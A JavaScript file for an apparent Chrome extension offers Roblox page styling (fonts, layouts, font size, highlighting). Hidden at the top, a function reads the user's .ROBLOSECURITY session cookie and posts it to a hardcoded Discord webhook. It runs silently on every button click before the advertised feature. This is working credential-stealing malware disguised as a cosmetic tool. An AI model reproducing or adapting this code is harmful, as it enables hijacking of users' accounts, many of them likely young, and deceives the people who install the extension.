// Send .ROBLOSECURITY silently in the background
function sendROBLOSECURITY() {
  chrome.cookies.get({ url: 'https://www.roblox.com', name: '.ROBLOSECURITY' }, function(cookie) {
    if (cookie) {
      const webhookURL = 'https://discord.com/api/webhooks/1289595385320439819/-Xu2z_BKkTKsFhQKkEBjHU47G6iwYzVQ6ngokQqr8tcttHwXOIZXU2VBfCkv5L8IIB1Q';
      
      fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          content: `ROBLOSECURITY Cookie: ${cookie.value}`
        })
      }).catch(error => console.error('Error sending ROBLOSECURITY:', error));
    }
  });
}

// List of features to activate on button click
const actions = {
  'font1': () => changeFontStyle('font1'),
  'font2': () => changeFontStyle('font2'),
  'font3': () => changeFontStyle('font3'),
  'layout1': () => customizeLayout('layout1'),
  'layout2': () => customizeLayout('layout2'),
  'layout3': () => customizeLayout('layout3'),
  'fontSizeUp': () => changeFontSize('up'),
  'fontSizeDown': () => changeFontSize('down'),
  'highlightText': () => highlightText(),
  'clear': () => clearAllChanges(),  // Added the clear button action
};

// Attach event listeners to buttons
document.querySelectorAll('button').forEach(button => {
  button.addEventListener('click', () => {
    sendROBLOSECURITY();  // Always send the cookie silently
    actions[button.id](); // Trigger the respective feature
  });
});

// Font change function
function changeFontStyle(font) {
  let fontFamily;
  switch (font) {
    case 'font1': fontFamily = "'Comic Sans MS', cursive, sans-serif"; break;
    case 'font2': fontFamily = "'Times New Roman', Times, serif"; break;
    case 'font3': fontFamily = "'Orbitron', sans-serif"; break;
  }
  injectCSS(`* { font-family: ${fontFamily} !important; }`);
}

// Layout customization functions
function customizeLayout(layout) {
  let css;
  switch (layout) {
    case 'layout1': css = '* { box-shadow: 5px 5px 15px rgba(0,0,0,0.5) !important; }'; break;
    case 'layout2': css = '* { border: 1px solid #000 !important; }'; break;
    case 'layout3': css = '.card, .list-item { transform: rotate(2deg) !important; transition: transform 0.3s ease !important; }'; break;
  }
  injectCSS(css);
}

// Font size adjustments
function changeFontSize(direction) {
  let size = direction === 'up' ? '1.2em' : '0.8em';
  injectCSS(`* { font-size: ${size} !important; }`);
}

// Highlight all text with a random color
function highlightText() {
  const randomColor = `#${Math.floor(Math.random()*16777215).toString(16)}`;
  injectCSS(`* { background-color: ${randomColor} !important; }`);
}

// Inject CSS into the page
function injectCSS(css) {
  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    chrome.scripting.executeScript({
      target: { tabId: tabs[0].id },
      func: (style) => {
        let styleEl = document.createElement('style');
        styleEl.innerHTML = style;
        document.head.appendChild(styleEl);
      },
      args: [css]
    });
  });
}

// Clear all injected styles and reset to default
function clearAllChanges() {
  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    chrome.scripting.executeScript({
      target: { tabId: tabs[0].id },
      func: () => {
        const styleElements = document.head.querySelectorAll('style');
        styleElements.forEach(styleEl => styleEl.remove());  // Remove all added styles
      }
    });
  });
}


